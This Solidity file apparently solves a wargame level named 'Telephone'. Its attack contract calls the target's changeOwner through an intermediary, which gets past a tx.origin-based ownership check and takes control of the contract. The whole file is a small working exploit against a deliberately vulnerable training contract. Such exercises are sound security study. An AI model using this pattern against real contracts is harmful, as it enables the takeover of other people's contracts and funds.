// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../04-Telephone.sol";

contract TelephoneAttack {
    address public owner;
    Telephone target;

    constructor(address _targetAddress) public {
        target = Telephone(_targetAddress);
    }

    function attack() public {
        target.changeOwner(msg.sender);
    }
}
